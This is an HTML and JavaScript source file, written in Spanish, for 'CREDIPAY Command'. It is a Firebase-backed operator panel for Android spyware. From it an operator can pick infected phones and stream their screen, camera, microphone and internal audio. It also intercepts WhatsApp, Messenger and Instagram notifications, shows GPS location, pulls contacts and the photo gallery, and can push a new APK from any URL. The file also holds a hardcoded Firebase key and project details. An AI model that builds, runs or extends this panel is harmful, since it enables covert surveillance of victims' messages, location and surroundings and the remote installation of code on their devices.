<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>MDM Intelligence - Cyber Command</title>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap');

        :root {
            --accent: #00ff88;
            --accent-glow: rgba(0, 255, 136, 0.3);
            --bg: #050505;
            --card-bg: rgba(20, 20, 20, 0.85);
            --border: rgba(255, 255, 255, 0.08);
            --danger: #ff4444;
        }

        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; display: flex; height: 100vh; overflow: hidden; }

        /* Sidebar lateral */
        #sidebar { width: 280px; background: #080808; border-right: 1px solid var(--border); padding: 30px 15px; display: flex; flex-direction: column; z-index: 100; box-shadow: 15px 0 50px #000; }
        .sidebar-title { color: var(--accent); font-size: 1.2em; font-weight: 800; letter-spacing: 3px; text-align: center; margin-bottom: 40px; text-transform: uppercase; text-shadow: 0 0 10px var(--accent-glow); }

        .device-item { padding: 18px; border: 1px solid var(--border); margin-bottom: 12px; border-radius: 16px; cursor: pointer; background: rgba(255,255,255,0.02); transition: 0.3s; display: flex; align-items: center; gap: 15px; position: relative; }
        .device-item:hover { border-color: var(--accent); transform: translateX(8px); }
        .active-device { background: linear-gradient(135deg, var(--accent), #00ccff) !important; color: #000 !important; font-weight: 800; border: none !important; box-shadow: 0 10px 30px var(--accent-glow); }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; position: absolute; top: 15px; right: 15px; border: 2px solid #000; }
        .dot-ONLINE { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
        .dot-OFFLINE { background: #444; }

        /* Contenedor Principal */
        #main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; background: radial-gradient(circle at bottom left, #111, #050505); }
        header { padding: 20px 40px; background: rgba(0,0,0,0.2); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }

        .dashboard-grid {
            display: grid;
            grid-template-columns: 1.5fr 1fr 1.2fr;
            gap: 20px;
            padding: 20px;
            height: calc(100vh - 70px);
            box-sizing: border-box;
        }

        .column { display: flex; flex-direction: column; gap: 20px; overflow: hidden; }
        .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 24px; display: flex; flex-direction: column; overflow: hidden; backdrop-filter: blur(15px); transition: 0.3s; flex: 1; }
        .card-header { background: rgba(255,255,255,0.03); padding: 12px 20px; color: var(--accent); font-weight: 700; font-size: 0.8em; text-transform: uppercase; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .card-body { padding: 15px; flex: 1; overflow-y: auto; position: relative; }

        .live-container { position: relative; width: 100%; height: 100%; min-height: 0; background: #000; border-radius: 15px; overflow: hidden; border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; }
        .live-img { max-width: 100%; max-height: 100%; object-fit: contain; }

        /* Aspecto de Mensajes Moderno */
        .msg-row { padding: 15px; background: rgba(255,255,255,0.03); border-radius: 15px; margin-bottom: 15px; border: 1px solid var(--border); position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .msg-app { color: var(--accent); font-weight: 800; font-size: 0.65em; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; text-transform: uppercase; letter-spacing: 1px; }
        .msg-time { float: right; color: #555; font-size: 0.8em; font-weight: 400; }
        .msg-title { font-weight: 800; font-size: 0.9em; margin-bottom: 4px; display: block; color: #eee; }
        .msg-text { font-size: 0.85em; color: #bbb; line-height: 1.4; }

        #map { width: 100%; height: 180px; border-radius: 15px; border: 1px solid var(--border); filter: invert(90%) hue-rotate(180deg) brightness(0.8); }
        .btn-icon { background: rgba(255,255,255,0.05); color: var(--accent); border: 1px solid var(--border); padding: 8px 12px; border-radius: 10px; cursor: pointer; transition: 0.3s; font-size: 0.85em; font-weight: bold; }
        .btn-icon:hover { background: var(--accent); color: #000; }
        .btn-icon.active { background: var(--accent); color: #000; box-shadow: 0 0 15px var(--accent); }

        /* Modales */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .modal-content { background: #0f0f0f; width: 450px; height: 85vh; border-radius: 30px; border: 1px solid var(--accent); display: flex; flex-direction: column; padding: 25px; box-shadow: 0 0 50px rgba(0,255,136,0.2); }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .modal-item { padding: 12px; border-bottom: 1px solid #222; display: flex; align-items: center; gap: 15px; font-size: 0.9em; }
        .modal-item i { color: var(--accent); font-size: 1.2em; }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); gap: 10px; width: 100%; }
        .gallery-grid img { width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 10px; border: 1px solid var(--border); transition: 0.3s; cursor: pointer; }
        .gallery-grid img:hover { transform: scale(1.1); z-index: 10; border-color: var(--accent); }
    </style>
</head>
<body>

    <div id="sidebar">
        <div class="sidebar-title">CREDIPAY Command</div>
        <div id="device-list">Escaneando se침ales...</div>
    </div>

    <div id="main-content">
        <header>
            <div id="current-device-name" style="font-weight: 800; color: var(--accent);">SELECCIONE TERMINAL</div>
            <div id="header-actions" style="display: none; gap: 15px;">
                <button class="btn-icon" style="color:#00ccff;" onclick="updateSoftware()"><i class="fas fa-sync-alt"></i> ACTUALIZAR</button>
                <button class="btn-icon" onclick="openModal('calls-modal')">LLAMADAS</button>
                <button class="btn-icon" onclick="openModal('contacts-modal')">AGENDA</button>
                <button class="btn-icon" style="color: #ff4444;" onclick="deleteDevice()"><i class="fas fa-trash"></i></button>
            </div>
        </header>

        <div id="dashboard-ui" class="dashboard-grid" style="display:none;">
            <div class="column">
                <div class="card" style="flex: 1.6;">
                    <div class="card-header">Video Pantalla
                        <div>
                            <button id="btn-int-audio" class="btn-icon" title="Sonido Sistema" onclick="toggleInternalAudio()"><i class="fas fa-volume-up"></i></button>
                            <button class="btn-icon" style="background:var(--accent); color:#000; margin-left:10px;" onclick="sendCmd('SCREEN_START')">ON</button>
                        </div>
                    </div>
                    <div class="card-body"><div class="live-container"><img id="screen-view" class="live-img"></div></div>
                </div>
                <div class="card">
                    <div class="card-header">C치mara Remota
                        <div style="display:flex; gap:10px;">
                            <button class="btn-icon" onclick="sendCam('START_BACK')">BACK</button>
                            <button class="btn-icon" onclick="sendCam('START_FRONT')">FRONT</button>
                            <button class="btn-icon" style="color:var(--danger);" onclick="sendCam('STOP')">OFF</button>
                        </div>
                    </div>
                    <div class="card-body">
                        <div id="camera-busy" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:10; flex-direction:column; align-items:center; justify-content:center; color:var(--danger); font-weight:bold;"><i class="fas fa-video-slash" style="font-size:30px;"></i> C츼MARA OCUPADA</div>
                        <div class="live-container"><img id="camera-view" class="live-img"></div>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">Interceptaci칩n de Mensajes</div>
                <div class="card-body" id="notif-list" style="display:block; padding:15px;"></div>
            </div>

            <div class="column">
                <div class="card" style="flex: 0 0 auto;"><div class="card-header">Localizaci칩n GPS</div><div class="card-body" style="padding:0;"><div id="map"></div></div></div>
                <div class="card"><div class="card-header">Galer칤a Realtime <button class="btn-icon" onclick="sendCmd('SYNC_GALLERY')"><i class="fas fa-sync"></i></button></div><div class="card-body" style="display:block;"><div id="gallery-grid" class="gallery-grid"></div></div></div>
                <button id="btn-mic-audio" class="btn-icon" style="background:var(--accent); color:#000; padding:15px; border-radius:15px;" onclick="toggleMicAudio()"><i class="fas fa-microphone"></i> ESCUCHAR ENTORNO</button>
            </div>
        </div>
    </div>

    <!-- MODALES -->
    <div id="contacts-modal" class="modal"><div class="modal-content"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;"><h3>Agenda</h3><button onclick="closeModal('contacts-modal')" style="background:none; border:none; color:#fff; font-size:2em;">&times;</button></div><div id="modal-contacts-list" style="overflow-y:auto; flex:1;"></div></div></div>
    <div id="calls-modal" class="modal"><div class="modal-content"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;"><h3>Historial</h3><button onclick="closeModal('calls-modal')" style="background:none; border:none; color:#fff; font-size:2em;">&times;</button></div><div id="modal-calls-list" style="overflow-y:auto; flex:1;"></div></div></div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyCZuuTlWtW20G9ksqMxB5Z_I9U0GIlNoMc", authDomain: "credipay-3d6dc.firebaseapp.com", databaseURL: "https://credipay-3d6dc-default-rtdb.firebaseio.com", projectId: "credipay-3d6dc", storageBucket: "credipay-3d6dc.appspot.com" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentId = "", audioCtx, map, marker, activeRefs = [];
        let micRef, intRef, nextMicTime = 0, nextIntTime = 0, micActive = false, intActive = false;

        db.ref('device_list').on('value', snap => {
            const list = document.getElementById('device-list'); list.innerHTML = "";
            const devices = snap.val(); if (devices) { for (let id in devices) {
                const div = document.createElement('div'); div.className = 'device-item' + (id === currentId ? ' active-device' : '');
                div.innerHTML = `<i class="fas fa-shield-alt" style="margin-right:10px;"></i> <b>${devices[id]}</b><div id="dot-${id}" class="status-dot dot-OFFLINE"></div>`;
                div.onclick = () => connectToDevice(id, devices[id]); list.appendChild(div);
                db.ref(`devices/${id}/status`).on('value', s => { if(document.getElementById(`dot-${id}`)) document.getElementById(`dot-${id}`).className = "status-dot dot-" + (s.val() || "OFFLINE"); });
            }}
        });

        function appIcon(pkg) {
            if(pkg.includes('whatsapp')) return '<i class="fab fa-whatsapp" style="color:#25D366"></i>';
            if(pkg.includes('messenger')) return '<i class="fab fa-facebook-messenger" style="color:#0084ff"></i>';
            if(pkg.includes('instagram')) return '<i class="fab fa-instagram" style="color:#E1306C"></i>';
            return '<i class="fas fa-bell"></i>';
        }

        function connectToDevice(id, name) {
            // --- LIMPIEZA TOTAL CRITICA ---
            if (activeRefs.length > 0) { activeRefs.forEach(r => r.off()); activeRefs = []; }
            if (micRef) micRef.off(); if (intRef) intRef.off();
            micActive = false; intActive = false; updateAudioButtons();

            currentId = id; document.getElementById('dashboard-ui').style.display = "grid";
            document.getElementById('header-actions').style.display = "flex";
            document.getElementById('current-device-name').innerText = name.toUpperCase();

            document.getElementById('gallery-grid').innerHTML = ""; document.getElementById('notif-list').innerHTML = "";
            document.getElementById('camera-view').src = ""; document.getElementById('screen-view').src = "";

            if (!map) { map = L.map('map').setView([0, 0], 2); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map); marker = L.marker([0, 0]).addTo(map); }

            // --- ESCUCHAS INDEPENDIENTES ---
            const cRef = db.ref(`devices/${id}/camera`);
            cRef.on('value', s => { if (s.val()) document.getElementById('camera-view').src = "data:image/jpeg;base64," + s.val(); });
            activeRefs.push(cRef);

            const sRef = db.ref(`devices/${id}/screen`);
            sRef.on('value', s => { if (s.val()) document.getElementById('screen-view').src = "data:image/jpeg;base64," + s.val(); });
            activeRefs.push(sRef);

            db.ref(`devices/${id}/notifications`).limitToLast(25).on('child_added', s => {
                let n = s.val(); let t = new Date(n.time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
                if (n.app.includes('whatsapp') || n.title.toLowerCase().includes('llamada')) {
                    const callRow = document.createElement('div'); callRow.className = 'modal-item';
                    callRow.innerHTML = `<i class="fas fa-phone-alt"></i> <div><b>${n.title}</b><br><small>${n.text}</small></div>`;
                    document.getElementById('modal-calls-list').prepend(callRow);
                }
                const row = document.createElement('div'); row.className = 'msg-row';
                row.innerHTML = `<span class="msg-time">${t}</span><div class="msg-app">${appIcon(n.app)} ${n.app.split('.').pop()}</div><b class="msg-title">${n.title}</b><div class="msg-text">${n.text}</div>`;
                document.getElementById('notif-list').prepend(row);
            });

            db.ref(`devices/${id}/location`).on('value', s => { if (s.val()) { let pos = [s.val().lat, s.val().lng]; marker.setLatLng(pos); map.setView(pos, 15); } });
            db.ref(`devices/${id}/contacts`).on('value', s => {
                const list = document.getElementById('modal-contacts-list'); list.innerHTML = "";
                if (s.val()) s.val().forEach(c => list.innerHTML += `<div style="padding:12px; border-bottom:1px solid #222;">游녻 <b>${c.name}</b><br><small>${c.phone}</small></div>`);
            });
            const gRef = db.ref(`devices/${id}/gallery`).limitToLast(24);
            gRef.on('child_added', s => { let img = document.createElement('img'); img.src = "data:image/jpeg;base64," + s.val(); img.onclick = () => window.open(img.src); document.getElementById('gallery-grid').prepend(img); });
            activeRefs.push(gRef);
        }

        function initAudio() { if (!audioCtx) audioCtx = new AudioContext(); if (audioCtx.state === 'suspended') audioCtx.resume(); }
        function toggleMicAudio() {
            initAudio(); micActive = !micActive; updateAudioButtons();
            db.ref(`devices/${currentId}/mic_cmd`).set(micActive ? "START_" + Date.now() : "STOP_" + Date.now());
            if (micRef) micRef.off();
            if (micActive) { micRef = db.ref(`devices/${currentId}/audio`); micRef.on('value', snap => playAudio(snap.val(), true)); }
        }
        function toggleInternalAudio() {
            initAudio(); intActive = !intActive; updateAudioButtons();
            db.ref(`devices/${currentId}/internal_audio_cmd`).set(intActive ? "START_" + Date.now() : "STOP_" + Date.now());
            if (intRef) intRef.off();
            if (intActive) { intRef = db.ref(`devices/${currentId}/internal_audio`); intRef.on('value', snap => playAudio(snap.val(), false)); }
        }
        function updateAudioButtons() {
            const micBtn = document.getElementById('btn-mic-audio');
            const intBtn = document.getElementById('btn-int-audio');
            if (micBtn) { micBtn.innerHTML = micActive ? '<i class="fas fa-stop-circle"></i> SILENCIAR' : '<i class="fas fa-microphone"></i> ESCUCHAR MIC'; micBtn.style.background = micActive ? '#ff4444' : 'var(--accent)'; }
            if (intBtn) intBtn.classList.toggle('active', intActive);
        }
        function playAudio(base64, isMic) {
            if (!base64 || !audioCtx) return;
            const binary = window.atob(base64); const bytes = new Int16Array(binary.length / 2);
            for (let i = 0; i < binary.length; i += 2) bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
            const buffer = audioCtx.createBuffer(1, bytes.length, 16000);
            buffer.getChannelData(0).set(Array.from(bytes).map(v => v / 32768));
            const source = audioCtx.createBufferSource(); source.buffer = buffer; source.connect(audioCtx.destination);
            let time = isMic ? nextMicTime : nextIntTime; if (time < audioCtx.currentTime) time = audioCtx.currentTime;
            source.start(time); if (isMic) nextMicTime = time + buffer.duration; else nextIntTime = time + buffer.duration;
        }
        function openModal(id) { document.getElementById(id).style.display = "flex"; }
        function closeModal(id) { document.getElementById(id).style.display = "none"; }
        function sendCam(cmd) { if(currentId) db.ref(`devices/${currentId}/cam_cmd`).set(cmd + "_" + Date.now()); }
        function sendCmd(cmd) { if(currentId) db.ref(`devices/${currentId}/main_cmd`).set(cmd + "_" + Date.now()); }
        function deleteDevice() { if(confirm("쮼liminar?")) { db.ref(`devices/${currentId}`).remove(); db.ref(`device_list/${currentId}`).remove(); location.reload(); } }
        function updateSoftware() { const url = prompt("Link del APK:"); if(url) sendCmd("UPDATE_APP_" + url); }
    </script>
</body>
</html>
